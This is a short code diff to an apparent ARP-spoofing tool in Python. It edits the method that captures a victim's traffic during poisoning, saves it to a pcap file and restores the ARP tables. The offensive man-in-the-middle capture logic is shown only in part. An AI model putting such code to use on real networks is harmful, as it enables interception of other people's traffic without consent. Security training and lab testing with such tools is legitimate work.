@@ -106,14 +106,23 @@ class Arp:
         '''
         Sniff packets from the victim
         '''
-        time.sleep(5)
-        print(f'Sniffing {self.count} packets')
+        log_directory = 'dumps'
+        if not os.path.exists(log_directory):
+            os.makedirs(log_directory)
+            
+        time.sleep(4)
+        print(f'[i] Sniffing {self.count} packets')
+        
         bpf_filter = f'ip host {self.victim}' 
         packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
+        
         print_color(f'\n[*] Writing packets to file arp.pcap...', 'green')
+        
         wrpcap(self.filename, packets)
+        
         self.restore()
         self.poison_thread.terminate()
+        
         print_color('[*] Finished', 'green')
     
     def restore(self) -> None:
